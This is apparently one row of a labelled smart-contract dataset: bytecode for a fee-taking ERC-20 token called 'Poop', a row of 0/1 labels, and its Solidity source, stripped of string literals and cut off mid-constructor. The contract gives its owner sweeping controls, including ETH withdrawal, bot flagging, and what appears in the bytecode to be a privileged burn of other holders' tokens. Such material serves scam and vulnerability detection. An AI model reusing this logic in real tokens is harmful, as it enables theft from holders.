}}",0x6080604052600436106103b15760003560e01c806392136913116101e7578063b62496f51161010d578063e2f45605116100a0578063f2fde38b1161006f578063f2fde38b14610a7e578063f637434214610a9e578063f834380a14610ab4578063fd34d3e114610ae457600080fd5b8063e2f4560514610a1c578063e71dc3f514610a32578063f0c34a9614610a48578063f11a24d314610a6857600080fd5b8063d1d5b2f0116100dc578063d1d5b2f014610980578063d257b34f146109a0578063d85ba063146109c0578063dd62ed3e146109d657600080fd5b8063b62496f5146108f5578063bbc0c74214610925578063c024666814610946578063c876d0b91461096657600080fd5b80639fccce3211610185578063aa4bde2811610154578063aa4bde2814610893578063adb873bd146108a9578063b19ab076146108bf578063b3ae65d7146108df57600080fd5b80639fccce3214610827578063a0d82dc51461083d578063a457c2d714610853578063a9059cbb1461087357600080fd5b80639a7a23d6116101c15780639a7a23d6146107ae5780639c3b4fdc146107ce5780639cf55183146107e45780639e6a5a35146107fa57600080fd5b8063921369131461076357806395d89b411461077957806398f9724f1461078e57600080fd5b80634e24f51a116102d7578063751039fc1161026a5780637bce5a04116102395780637bce5a0414610702578063841640041461071857806388e765ff1461072f5780638da5cb5b1461074557600080fd5b8063751039fc1461068d5780637571336a146106a257806378a8e5df146106c25780637b6d0265146106e257600080fd5b80636b0a894c116102a65780636b0a894c146106215780636ddd17131461063757806370a0823114610658578063715018a61461067857600080fd5b80634e24f51a146105b55780635dfbe157146105d557806366d602ae146105f55780636a486a8e1461060b57600080fd5b80631d7778561161034f578063313ce5671161031e578063313ce56714610543578063395093511461055f5780633dd5b2da1461057f5780634a62bb651461059457600080fd5b80631d777856146104d55780631f0d860e146104eb5780631f3fed8f1461050d57806323b872dd1461052357600080fd5b806310d5de531161038b57806310d5de531461045057806312d7626d1461048057806318160ddd146104a05780631a8145bb146104bf57600080fd5b806306fdde03146103bd5780630758d924146103e8578063095ea7b31461042057600080fd5b366103b857005b600080fd5b3480156103c957600080fd5b506103d2610b04565b6040516103df9190612ec2565b60405180910390f35b3480156103f457600080fd5b50600954610408906001600160a01b031681565b6040516001600160a01b0390911681526020016103df565b34801561042c57600080fd5b5061044061043b366004612f2f565b610b96565b60405190151581526020016103df565b34801561045c57600080fd5b5061044061046b366004612f5b565b60256020526000908152604090205460ff1681565b34801561048c57600080fd5b50600a54610408906001600160a01b031681565b3480156104ac57600080fd5b506002545b6040519081526020016103df565b3480156104cb57600080fd5b506104b160215481565b3480156104e157600080fd5b506104b160225481565b3480156104f757600080fd5b5061050b610506366004612f5b565b610bad565b005b34801561051957600080fd5b506104b160205481565b34801561052f57600080fd5b5061044061053e366004612f7f565b610c67565b34801561054f57600080fd5b50604051601281526020016103df565b34801561056b57600080fd5b5061044061057a366004612f2f565b610d11565b34801561058b57600080fd5b5061050b610d4d565b3480156105a057600080fd5b5060135461044090600160a01b900460ff1681565b3480156105c157600080fd5b5061050b6105d0366004612f5b565b610dc4565b3480156105e157600080fd5b50600c54610408906001600160a01b031681565b34801561060157600080fd5b506104b160075481565b34801561061757600080fd5b506104b1601b5481565b34801561062d57600080fd5b506104b160115481565b34801561064357600080fd5b5060135461044090600160b01b900460ff1681565b34801561066457600080fd5b506104b1610673366004612f5b565b610e66565b34801561068457600080fd5b5061050b610e81565b34801561069957600080fd5b5061050b610ef5565b3480156106ae57600080fd5b5061050b6106bd366004612fce565b610f61565b3480156106ce57600080fd5b5061050b6106dd366004612fce565b611029565b3480156106ee57600080fd5b5061050b6106fd366004613007565b61107e565b34801561070e57600080fd5b506104b160175481565b34801561072457600080fd5b50600f544310610440565b34801561073b57600080fd5b506104b160065481565b34801561075157600080fd5b506005546001600160a01b0316610408565b34801561076f57600080fd5b506104b1601c5481565b34801561078557600080fd5b506103d2611234565b34801561079a57600080fd5b50601254610408906001600160a01b031681565b3480156107ba57600080fd5b5061050b6107c9366004612fce565b611243565b3480156107da57600080fd5b506104b160195481565b3480156107f057600080fd5b506104b1600e5481565b34801561080657600080fd5b506104b1610815366004612f5b565b60146020526000908152604090205481565b34801561083357600080fd5b506104b160235481565b34801561084957600080fd5b506104b1601e5481565b34801561085f57600080fd5b5061044061086e366004612f2f565b611337565b34801561087f57600080fd5b5061044061088e366004612f2f565b6113d0565b34801561089f57600080fd5b506104b160085481565b3480156108b557600080fd5b506104b1601f5481565b3480156108cb57600080fd5b50600d54610408906001600160a01b031681565b3480156108eb57600080fd5b506104b1600f5481565b34801561090157600080fd5b50610440610910366004612f5b565b60266020526000908152604090205460ff1681565b34801561093157600080fd5b5060135461044090600160a81b900460ff1681565b34801561095257600080fd5b5061050b610961366004612fce565b6113dd565b34801561097257600080fd5b506015546104409060ff1681565b34801561098c57600080fd5b5061044061099b366004613020565b611466565b3480156109ac57600080fd5b5061050b6109bb366004613007565b61166f565b3480156109cc57600080fd5b506104b160165481565b3480156109e257600080fd5b506104b16109f1366004613020565b6001600160a01b03918216600090815260016020908152604080832093909416825291909152205490565b348015610a2857600080fd5b506104b1600b5481565b348015610a3e57600080fd5b506104b1601a5481565b348015610a5457600080fd5b5061050b610a63366004612f5b565b6117ba565b348015610a7457600080fd5b506104b160185481565b348015610a8a57600080fd5b5061050b610a99366004612f5b565b611894565b348015610aaa57600080fd5b506104b1601d5481565b348015610ac057600080fd5b50610440610acf366004612f5b565b60106020526000908152604090205460ff1681565b348015610af057600080fd5b5061050b610aff366004612f2f565b61197f565b606060038054610b139061304e565b80601f0160208091040260200160405190810160405280929190818152602001828054610b3f9061304e565b8015610b8c5780601f10610b6157610100808354040283529160200191610b8c565b820191906000526020600020905b815481529060010190602001808311610b6f57829003601f168201915b5050505050905090565b6000610ba3338484611a44565b5060015b92915050565b6005546001600160a01b03163314610be05760405162461bcd60e51b8152600401610bd790613088565b60405180910390fd5b6001600160a01b038116610c455760405162461bcd60e51b815260206004820152602660248201527f5f6d61726b6574696e67547265617375727920616464726573732063616e6e6f60448201526507420626520360d41b6064820152608401610bd7565b600c80546001600160a01b0319166001600160a01b0392909216919091179055565b6000610c74848484611b69565b6001600160a01b038416600090815260016020908152604080832033845290915290205482811015610cf95760405162461bcd60e51b815260206004820152602860248201527f45524332303a207472616e7366657220616d6f756e74206578636565647320616044820152676c6c6f77616e636560c01b6064820152608401610bd7565b610d068533858403611a44565b506001949350505050565b3360008181526001602090815260408083206001600160a01b03871684529091528120549091610ba3918590610d489086906130d3565b611a44565b6005546001600160a01b03163314610d775760405162461bcd60e51b8152600401610bd790613088565b604051600090339047908381818185875af1925050503d8060008114610db9576040519150601f19603f3d011682016040523d82523d6000602084013e610dbe565b606091505b50505050565b6005546001600160a01b03163314610dee5760405162461bcd60e51b8152600401610bd790613088565b6001600160a01b038116610e445760405162461bcd60e51b815260206004820181905260248201527f5f646576547265617375727920616464726573732063616e6e6f7420626520306044820152606401610bd7565b600d80546001600160a01b0319166001600160a01b0392909216919091179055565b6001600160a01b031660009081526020819052604090205490565b6005546001600160a01b03163314610eab5760405162461bcd60e51b8152600401610bd790613088565b6005546040516000916001600160a01b0316907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a3600580546001600160a01b0319169055565b6005546001600160a01b03163314610f1f5760405162461bcd60e51b8152600401610bd790613088565b6013805460ff60a01b191690556015805460ff191690556040517fa4ffae85e880608d5d4365c2b682786545d136145537788e7e0940dff9f0b98c90600090a1565b6005546001600160a01b03163314610f8b5760405162461bcd60e51b8152600401610bd790613088565b80610ffe57600a546001600160a01b0390811690831603610ffe5760405162461bcd60e51b815260206004820152602760248201527f43616e6e6f742072656d6f766520756e697377617020706169722066726f6d2060448201526636b0bc103a3c3760c91b6064820152608401610bd7565b6001600160a01b03919091166000908152602560205260409020805460ff1916911515919091179055565b6005546001600160a01b031633146110535760405162461bcd60e51b8152600401610bd790613088565b6001600160a01b03919091166000908152601060205260409020805460ff1916911515919091179055565b6005546001600160a01b031633146110a85760405162461bcd60e51b8152600401610bd790613088565b6040805160028082526060820183526000926020830190803683375050600954604080516315ab88c960e31b815290519394506001600160a01b039091169263ad5c4648925060048083019260209291908290030181865afa158015611112573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061113691906130eb565b8160008151811061114957611149613108565b60200260200101906001600160a01b031690816001600160a01b031681525050308160018151811061117d5761117d613108565b6001600160a01b03928316602091820292909201015260095460405163b6f9de9560e01b815291169063b6f9de959084906111c590600090869061dead904290600401613162565b6000604051808303818588803b1580156111de57600080fd5b505af11580156111f2573d6000803e3d6000fd5b50505050507f3610724e73d2c8d284a87922040e53efbc7d62f0b9c0081500dc2110db9bce208260405161122891815260200190565b60405180910390a15050565b606060048054610b139061304e565b6005546001600160a01b0316331461126d5760405162461bcd60e51b8152600401610bd790613088565b600a546001600160a01b03908116908316036112f15760405162461bcd60e51b815260206004820152603960248201527f54686520706169722063616e6e6f742062652072656d6f7665642066726f6d2060448201527f6175746f6d617465644d61726b65744d616b65725061697273000000000000006064820152608401610bd7565b6112fb82826125d0565b604051811515906001600160a01b038416907fffa9187bf1f18bf477bd0ea1bcbb64e93b6a98132473929edfce215cd9b16fab90600090a35050565b3360009081526001602090815260408083206001600160a01b0386168452909152812054828110156113b95760405162461bcd60e51b815260206004820152602560248201527f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77604482015264207a65726f60d81b6064820152608401610bd7565b6113c63385858403611a44565b5060019392505050565b6000610ba3338484611b69565b6005546001600160a01b031633146114075760405162461bcd60e51b8152600401610bd790613088565b6001600160a01b038216600081815260246020908152604091829020805460ff191685151590811790915591519182527f9d8f7706ea1113d1a167b526eca956215946dd36cc7df39eb16180222d8b5df7910160405180910390a25050565b6005546000906001600160a01b031633146114935760405162461bcd60e51b8152600401610bd790613088565b6001600160a01b0383166114e95760405162461bcd60e51b815260206004820152601a60248201527f5f746f6b656e20616464726573732063616e6e6f7420626520300000000000006044820152606401610bd7565b306001600160a01b038416036115415760405162461bcd60e51b815260206004820152601c60248201527f43616e2774207769746864726177206e617469766520746f6b656e73000000006044820152606401610bd7565b6040516370a0823160e01b81523060048201526000906001600160a01b038516906370a0823190602401602060405180830381865afa158015611588573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906115ac9190613197565b60405163a9059cbb60e01b81526001600160a01b038581166004830152602482018390529192509085169063a9059cbb906044016020604051808303816000875af11580156115ff573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061162391906131b0565b604080516001600160a01b0387168152602081018490529193507f32dcf6a8321e324fa90bdd057f6a6c61edf75c3a33ef2216f52b5afb876346fa910160405180910390a15092915050565b6005546001600160a01b031633146116995760405162461bcd60e51b8152600401610bd790613088565b620186a06116a660025490565b6116b19060016131cd565b6116bb91906131ec565b8110156117285760405162461bcd60e51b815260206004820152603560248201527f5377617020616d6f756e742063616e6e6f74206265206c6f776572207468616e60448201527410181718181892903a37ba30b61039bab838363c9760591b6064820152608401610bd7565b6103e861173460025490565b61173f9060016131cd565b61174991906131ec565b8111156117b55760405162461bcd60e51b815260206004820152603460248201527f5377617020616d6f756e742063616e6e6f742062652068696768657220746861604482015273371018171892903a37ba30b61039bab838363c9760611b6064820152608401610bd7565b600b55565b6005546001600160a01b031633146117e45760405162461bcd60e51b8152600401610bd790613088565b601354600160a81b900460ff161561183e5760405162461bcd60e51b815260206004820152601760248201527f43616e6e6f74207265656e61626c652074726164696e670000000000000000006044820152606401610bd7565b601380546001600160a01b038316600162ffff0160a01b03199091161761010160a81b17905543600e556040517fa56feb2d31b9a7424db0be063fd450863979c9e2382cf5110f869bd1ad361bb790600090a150565b6005546001600160a01b031633146118be5760405162461bcd60e51b8152600401610bd790613088565b6001600160a01b0381166119235760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b6064820152608401610bd7565b6005546040516001600160a01b038084169216907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e090600090a3600580546001600160a01b0319166001600160a01b0392909216919091179055565b600b5461198b30610e66565b10156119d95760405162461bcd60e51b815260206004820152601d60248201527f636865636b696e672074686520737761706c69717569646974696679200000006044820152606401610bd7565b6119e382826125fe565b15611a4057600a805460ff60a01b1916600160a01b179055611a036126f0565b600a805460ff60a01b191690556040514281527fbffda9821a15ce050ca76f03947541eb7078e22ded244385b38caa5108a52a4490602001611228565b5050565b6001600160a01b038316611aa65760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b6064820152608401610bd7565b6001600160a01b038216611b075760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b6064820152608401610bd7565b6001600160a01b0383811660008181526001602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92591015b60405180910390a3505050565b6001600160a01b038316611b8f5760405162461bcd60e51b8152600401610bd79061320e565b6001600160a01b038216611bb55760405162461bcd60e51b8152600401610bd790613253565b60008111611c055760405162461bcd60e51b815260206004820152601d60248201527f616d6f756e74206d7573742062652067726561746572207468616e20300000006044820152606401610bd7565b601354600160a81b900460ff16611c9a576001600160a01b03831660009081526024602052604090205460ff1680611c5557506001600160a01b03821660009081526024602052604090205460ff165b611c9a5760405162461bcd60e51b81526020600482015260166024820152752a3930b234b7339034b9903737ba1030b1ba34bb329760511b6044820152606401610bd7565b600a546001600160a01b0390811690841603611cf0576001600160a01b0382166000908152601460205260408120549003611ceb576001600160a01b03821660009081526014602052604090204290555b611d1d565b600a54600160a01b900460ff16611d1d57601280546001600160a01b0319166001600160a01b0385161790555b600f5415611da9576001600160a01b03831660009081526010602052604090205460ff161580611d5a57506005546001600160a01b038381169116145b80611d6f57506001600160a01b03821661dead145b611da95760405162461bcd60e51b815260206004820152600b60248201526a626f746361746368696e6760a81b6044820152606401610bd7565b601354600160a01b900460ff1615612098576005546001600160a01b03848116911614801590611de757506005546001600160a01b03838116911614155b8015611dfb57506001600160a01b03821615155b8015611e1257506001600160a01b03821661dead14155b8015611e3757506001600160a01b03831660009081526024602052604090205460ff16155b8015611e5c57506001600160a01b03821660009081526024602052604090205460ff16155b15612098576001600160a01b03831660009081526026602052604090205460ff168015611ea257506001600160a01b03821660009081526025602052604090205460ff16155b15611f6e57600654811115611f0a5760405162461bcd60e51b815260206004820152602860248201527f427579207472616e7366657220616d6f756e742065786365656473207468652060448201526736b0bc10313abc9760c11b6064820152608401610bd7565b600854611f1683610e66565b611f2090836130d3565b1115611f695760405162461bcd60e51b815260206004820152601860248201527710d85b9b9bdd08115e18d95959081b585e081dd85b1b195d60421b6044820152606401610bd7565b612098565b6001600160a01b03821660009081526026602052604090205460ff168015611faf57506001600160a01b03831660009081526025602052604090205460ff16155b1561201957600754811115611f695760405162461bcd60e51b815260206004820152602a60248201527f53656c6c207472616e7366657220616d6f756e742065786365656473207468656044820152691036b0bc1039b2b6361760b11b6064820152608401610bd7565b6001600160a01b03821660009081526025602052604090205460ff166120985760085461204583610e66565b61204f90836130d3565b11156120985760405162461bcd60e51b815260206004820152601860248201527710d85b9b9bdd08115e18d95959081b585e081dd85b1b195d60421b6044820152606401610bd7565b60006120a330610e66565b600b54909150811080159081906120c35750601354600160b01b900460ff165b80156120d95750600a54600160a01b900460ff16155b80156120fe57506001600160a01b03851660009081526026602052604090205460ff16155b801561212357506001600160a01b03851660009081526024602052604090205460ff16155b801561214857506001600160a01b03841660009081526024602052604090205460ff16155b1561217657600a805460ff60a01b1916600160a01b1790556121686126f0565b600a805460ff60a01b191690555b6001600160a01b03851660009081526024602052604090205460019060ff16806121b857506001600160a01b03851660009081526024602052604090205460ff165b156121c1575060005b600081156125bc57600f54431080156121f257506001600160a01b03871660009081526026602052604090205460ff165b801561221757506001600160a01b03861660009081526026602052604090205460ff16155b801561222557506000601654115b156123a5576001600160a01b03861660009081526010602052604090205460ff166122c5576001600160a01b0386166000908152601060205260408120805460ff1916600190811790915560118054919290916122839084906130d3565b90915550506040516001600160a01b03871681527fbd426d4843eab791209065ae576b9521ac2cf29b00b1c8168353ff07e751edd69060200160405180910390a15b60646122d28660636131cd565b6122dc91906131ec565b9050601654601854826122ef91906131cd565b6122f991906131ec565b6021600082825461230a91906130d3565b909155505060165460175461231f90836131cd565b61232991906131ec565b6020600082825461233a91906130d3565b909155505060165460195461234f90836131cd565b61235991906131ec565b6023600082825461236a91906130d3565b9091555050601654601a5461237f90836131cd565b61238991906131ec565b6022600082825461239a91906130d3565b9091555061259e9050565b6001600160a01b03861660009081526026602052604090205460ff1680156123cf57506000601b54115b15612491576064601b54866123e491906131cd565b6123ee91906131ec565b9050601b54601d548261240191906131cd565b61240b91906131ec565b6021600082825461241c91906130d3565b9091555050601b54601c5461243190836131cd565b61243b91906131ec565b6020600082825461244c91906130d3565b9091555050601b54601e5461246190836131cd565b61246b91906131ec565b6023600082825461247c91906130d3565b9091555050601b54601f5461237f90836131cd565b6001600160a01b03871660009081526026602052604090205460ff1680156124bb57506000601654115b1561259e576064601654866124d091906131cd565b6124da91906131ec565b9050601654601854826124ed91906131cd565b6124f791906131ec565b6021600082825461250891906130d3565b909155505060165460175461251d90836131cd565b61252791906131ec565b6020600082825461253891906130d3565b909155505060165460195461254d90836131cd565b61255791906131ec565b6023600082825461256891906130d3565b9091555050601654601a5461257d90836131cd565b61258791906131ec565b6022600082825461259891906130d3565b90915550505b80156125af576125af8730836129db565b6125b98186613296565b94505b6125c78787876129db565b50505050505050565b6001600160a01b0382166000908152602660205260409020805460ff19168215151790556112fb8282612b30565b33600090815260246020526040812054819060ff166126c8576000602254118015612633575060225461263030610e66565b10155b156126445761264433602254612b8c565b506000602281905560019061265830610e66565b9050600060235460205460215461266f91906130d3565b61267991906130d3565b9050811580612686575080155b156126975760009350505050610ba7565b600b546126a59060066131cd565b8211156126bd57600b546126ba9060066131cd565b91505b829350505050610ba7565b826126d230610e66565b116126e5576126e18484612b8c565b5060005b600061265830610e66565b600060225411801561270c575060225461270930610e66565b10155b1561271d5761271d30602254612b8c565b6000602281905561272d30610e66565b9050600060235460205460215461274491906130d3565b61274e91906130d3565b905081158061275b575080155b15612764575050565b600b546127729060056131cd565b82111561278a57600b546127879060056131cd565b91505b6000806002836021548661279e91906131cd565b6127a891906131ec565b6127b291906131ec565b90506127c66127c18286613296565b612cb6565b602154479081906000906127dc906002906131ec565b6127e69087613296565b6020546127f390856131cd565b6127fd91906131ec565b90506000600260215461281091906131ec565b61281a9088613296565b60235461282790866131cd565b61283191906131ec565b905061283d81836130d3565b6128479084613296565b60006021819055602081905560238190556022559250841580159061286c5750600083115b1561287b5761287b8584612e10565b6013546040516001600160a01b03909116908290600081818185875af1925050503d80600081146128c8576040519150601f19603f3d011682016040523d82523d6000602084013e6128cd565b606091505b505080965050856129205760405162461bcd60e51b815260206004820152601d60248201527f657468207472616e7366657220666f72206465762074726561737572790000006044820152606401610bd7565b600c546040516001600160a01b03909116904790600081818185875af1925050503d806000811461296d576040519150601f19603f3d011682016040523d82523d6000602084013e612972565b606091505b505080965050856129d15760405162461bcd60e51b815260206004820152602360248201527f657468207472616e7366657220666f72206d61726b6574696e6720747265617360448201526275727960e81b6064820152608401610bd7565b5050505050505050565b6001600160a01b038316612a015760405162461bcd60e51b8152600401610bd79061320e565b6001600160a01b038216612a275760405162461bcd60e51b8152600401610bd790613253565b6001600160a01b03831660009081526020819052604090205481811015612a9f5760405162461bcd60e51b815260206004820152602660248201527f45524332303a207472616e7366657220616d6f756e7420657863656564732062604482015265616c616e636560d01b6064820152608401610bd7565b6001600160a01b03808516600090815260208190526040808220858503905591851681529081208054849290612ad69084906130d3565b92505081905550826001600160a01b0316846001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef84604051612b2291815260200190565b60405180910390a350505050565b6001600160a01b038216600081815260256020908152604091829020805460ff19168515159081179091558251938452908301527f6b4f1be9103e6cbcd38ca4a922334f2c3109b260130a6676a987f94088fd67469101611228565b6001600160a01b038216612bec5760405162461bcd60e51b815260206004820152602160248201527f45524332303a206275726e2066726f6d20746865207a65726f206164647265736044820152607360f81b6064820152608401610bd7565b6001600160a01b03821660009081526020819052604090205481811015612c605760405162461bcd60e51b815260206004820152602260248201527f45524332303a206275726e20616d6f756e7420657863656564732062616c616e604482015261636560f01b6064820152608401610bd7565b6001600160a01b0383166000818152602081815260408083208686039055600280548790039055518581529192917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9101611b5c565b6040805160028082526060820183526000926020830190803683370190505090503081600081518110612ceb57612ceb613108565b6001600160a01b03928316602091820292909201810191909152600954604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa158015612d44573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190612d6891906130eb565b81600181518110612d7b57612d7b613108565b6001600160a01b039283166020918202929092010152600954612da19130911684611a44565b60095460405163791ac94760e01b81526001600160a01b039091169063791ac94790612dda9085906000908690309042906004016132ad565b600060405180830381600087803b158015612df457600080fd5b505af1158015612e08573d6000803e3d6000fd5b505050505050565b600954612e289030906001600160a01b031684611a44565b60095460405163f305d71960e01b815230600482015260248101849052600060448201819052606482015261dead60848201524260a48201526001600160a01b039091169063f305d71990839060c40160606040518083038185885af1158015612e96573d6000803e3d6000fd5b50505050506040513d601f19601f82011682018060405250810190612ebb91906132e9565b5050505050565b600060208083528351808285015260005b81811015612eef57858101830151858201604001528201612ed3565b81811115612f01576000604083870101525b50601f01601f1916929092016040019392505050565b6001600160a01b0381168114612f2c57600080fd5b50565b60008060408385031215612f4257600080fd5b8235612f4d81612f17565b946020939093013593505050565b600060208284031215612f6d57600080fd5b8135612f7881612f17565b9392505050565b600080600060608486031215612f9457600080fd5b8335612f9f81612f17565b92506020840135612faf81612f17565b929592945050506040919091013590565b8015158114612f2c57600080fd5b60008060408385031215612fe157600080fd5b8235612fec81612f17565b91506020830135612ffc81612fc0565b809150509250929050565b60006020828403121561301957600080fd5b5035919050565b6000806040838503121561303357600080fd5b823561303e81612f17565b91506020830135612ffc81612f17565b600181811c9082168061306257607f821691505b60208210810361308257634e487b7160e01b600052602260045260246000fd5b50919050565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b634e487b7160e01b600052601160045260246000fd5b600082198211156130e6576130e66130bd565b500190565b6000602082840312156130fd57600080fd5b8151612f7881612f17565b634e487b7160e01b600052603260045260246000fd5b600081518084526020808501945080840160005b838110156131575781516001600160a01b031687529582019590820190600101613132565b509495945050505050565b84815260806020820152600061317b608083018661311e565b6001600160a01b03949094166040830152506060015292915050565b6000602082840312156131a957600080fd5b5051919050565b6000602082840312156131c257600080fd5b8151612f7881612fc0565b60008160001904831182151516156131e7576131e76130bd565b500290565b60008261320957634e487b7160e01b600052601260045260246000fd5b500490565b60208082526025908201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604082015264647265737360d81b606082015260800190565b60208082526023908201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260408201526265737360e81b606082015260800190565b6000828210156132a8576132a86130bd565b500390565b85815284602082015260a0604082015260006132cc60a083018661311e565b6001600160a01b0394909416606083015250608001529392505050565b6000806000606084860312156132fe57600080fd5b835192506020840151915060408401519050925092509256fea2646970667358221220acc09455bbb312796aee8297fc4bf4ebbfb96e253c2b30ddb410f14aedccff4c64736f6c634300080f0033,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0
"pragma solidity 0.8.15;abstract contract Context { function _msgSender() internal view virtual returns (address) { return msg.sender; } function _msgData() internal view virtual returns (bytes calldata) { this; return msg.data; }}interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value);}interface IERC20Metadata is IERC20 { function name() external view returns (string memory); function symbol() external view returns (string memory); function decimals() external view returns (uint8);}contract ERC20 is Context, IERC20, IERC20Metadata { mapping(address => uint256) private _balances; mapping(address => mapping(address => uint256)) private _allowances; uint256 private _totalSupply; string private _name; string private _symbol; constructor(string memory name_, string memory symbol_) { _name = name_; _symbol = symbol_; } function name() public view virtual override returns (string memory) { return _name; } function symbol() public view virtual override returns (string memory) { return _symbol; } function decimals() public view virtual override returns (uint8) { return 18; } function totalSupply() public view virtual override returns (uint256) { return _totalSupply; } function balanceOf(address account) public view virtual override returns (uint256) { return _balances[account]; } function transfer(address recipient, uint256 amount) public virtual override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view virtual override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public virtual override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom( address sender, address recipient, uint256 amount ) public virtual override returns (bool) { _transfer(sender, recipient, amount); uint256 currentAllowance = _allowances[sender][_msgSender()]; require(currentAllowance >= amount, ); unchecked { _approve(sender, _msgSender(), currentAllowance - amount); } return true; } function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue); return true; } function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) { uint256 currentAllowance = _allowances[_msgSender()][spender]; require(currentAllowance >= subtractedValue, ); unchecked { _approve(_msgSender(), spender, currentAllowance - subtractedValue); } return true; } function _transfer( address sender, address recipient, uint256 amount ) internal virtual { require(sender != address(0), ); require(recipient != address(0), ); uint256 senderBalance = _balances[sender]; require(senderBalance >= amount, ); unchecked { _balances[sender] = senderBalance - amount; } _balances[recipient] += amount; emit Transfer(sender, recipient, amount); } function _createInitialSupply(address account, uint256 amount) internal virtual { require(account != address(0), ); _totalSupply += amount; _balances[account] += amount; emit Transfer(address(0), account, amount); } function _burn(address account, uint256 amount) internal virtual { require(account != address(0), ); uint256 accountBalance = _balances[account]; require(accountBalance >= amount, ); unchecked { _balances[account] = accountBalance - amount; _totalSupply -= amount; } emit Transfer(account, address(0), amount); } function _approve( address owner, address spender, uint256 amount ) internal virtual { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); }}contract Ownable is Context { address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); constructor () { address msgSender = _msgSender(); _owner = msgSender; emit OwnershipTransferred(address(0), msgSender); } function owner() public view returns (address) { return _owner; } modifier onlyOwner() { require(_owner == _msgSender(), ); _; } function renounceOwnership() external virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); } function transferOwnership(address newOwner) public virtual onlyOwner { require(newOwner != address(0), ); emit OwnershipTransferred(_owner, newOwner); _owner = newOwner; }}interface IDexRouter { function factory() external pure returns (address); function WETH() external pure returns (address); function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external; function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline ) external payable; function addLiquidityETH( address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline ) external payable returns ( uint256 amountToken, uint256 amountETH, uint256 liquidity );}interface IDexFactory { function createPair(address tokenA, address tokenB) external returns (address pair);}contract Poop is ERC20, Ownable { uint256 public maxBuyAmount; uint256 public maxSellAmount; uint256 public maxWalletAmount; IDexRouter public dexRouter; address public lpPair; bool private swapping; uint256 public swapTokensAtAmount; address operationsAddress; address devAddress; uint256 public tradingActiveBlock = 0; uint256 public blockForPenaltyEnd; mapping (address => bool) public boughtEarly; uint256 public botsCaught; bool public limitsInEffect = true; bool public tradingActive = false; bool public swapEnabled = false; mapping(address => uint256) private _holderLastTransferTimestamp; bool public transferDelayEnabled = true; uint256 public buyTotalFees; uint256 public buyOperationsFee; uint256 public buyLiquidityFee; uint256 public buyDevFee; uint256 public buyBurnFee; uint256 public sellTotalFees; uint256 public sellOperationsFee; uint256 public sellLiquidityFee; uint256 public sellDevFee; uint256 public sellBurnFee; uint256 public tokensForOperations; uint256 public tokensForLiquidity; uint256 public tokensForDev; uint256 public tokensForBurn; mapping (address => bool) private _isExcludedFromFees; mapping (address => bool) public _isExcludedMaxTransactionAmount; mapping (address => bool) public automatedMarketMakerPairs; event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value); event EnabledTrading(); event RemovedLimits(); event ExcludeFromFees(address indexed account, bool isExcluded); event UpdatedMaxBuyAmount(uint256 newAmount); event UpdatedMaxSellAmount(uint256 newAmount); event UpdatedMaxWalletAmount(uint256 newAmount); event UpdatedOperationsAddress(address indexed newWallet); event MaxTransactionExclusion(address _address, bool excluded); event BuyBackTriggered(uint256 amount); event OwnerForcedSwapBack(uint256 timestamp); event CaughtEarlyBuyer(address sniper); event SwapAndLiquify( uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity ); event TransferForeignToken(address token, uint256 amount); constructor() ERC20(, ) { address newOwner = msg.sender; IDexRouter _dexRouter = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); dexRouter = _dexRouter; lpPair = IDexFactory(_dexRouter.factory()).createPair(address(this), _dexRouter.WETH()); _excludeFromMaxTransaction(address(lpPair), true); _setAutomatedMarketMakerPair(address(lpPair), true); uint256 totalSupply = 1000000000 * 1e18; maxBuyAmount = totalSupply * 15 / 1000; maxSellAmount = totalSupply * 15 / 1000; maxWalletAmount = totalSupply * 15 / 1000; swapTokensAtAmount = totalSupply * 3 / 1000; buyOperationsFee = 25; buyLiquidityFee = 0; buyDevFee = 0; 